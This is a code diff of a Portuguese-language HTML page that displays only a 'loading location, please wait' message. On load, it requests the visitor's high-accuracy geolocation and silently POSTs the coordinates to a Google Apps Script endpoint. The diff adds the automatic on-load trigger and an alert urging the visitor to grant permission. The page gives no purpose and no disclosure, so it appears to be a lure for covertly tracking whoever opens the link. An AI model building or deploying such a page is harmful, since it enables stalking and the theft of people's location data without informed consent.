@@ -14,33 +14,47 @@
   </style>
 </head>
 <body>
-  <h2>Carregando...</h2>
+  <h2>Carregando localização...</h2>
   <p>Aguarde um momento</p>
 
   <script>
     function enviarLocalizacao(latitude, longitude) {
-      console.log("Enviando localização:", latitude, longitude); // 👈 pra debug
+      console.log("Enviando localização:", latitude, longitude);
       fetch("https://script.google.com/macros/s/AKfycbwDXb0R6cphJ16dAhebrSidxPCucyjaWVhD6WNgr66i-19hqQ8oHzEs-kH5tX7RLlt2Fg/exec", {
         method: "POST",
-        body: JSON.stringify({ latitude, longitude }),
         headers: {
           "Content-Type": "application/json"
-        }
-      });
+        },
+        body: JSON.stringify({ latitude, longitude })
+      })
+      .then(response => console.log("Enviado com sucesso"))
+      .catch(error => console.error("Erro ao enviar:", error));
     }
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          enviarLocalizacao(position.coords.latitude, position.coords.longitude);
-        },
-        (error) => {
-          console.error("Erro ao obter localização:", error);
-        }
-      );
-    } else {
-      console.error("Geolocalização não suportada.");
+    function pedirLocalizacao() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            enviarLocalizacao(position.coords.latitude, position.coords.longitude);
+          },
+          (error) => {
+            console.error("Erro ao obter localização:", error);
+            alert("Por favor, permita o acesso à sua localização.");
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+          }
+        );
+      } else {
+        alert("Seu navegador não suporta geolocalização.");
+      }
     }
+
+    // Dispara quando a página carrega
+    window.onload = pedirLocalizacao;
   </script>
 </body>
 </html>
+
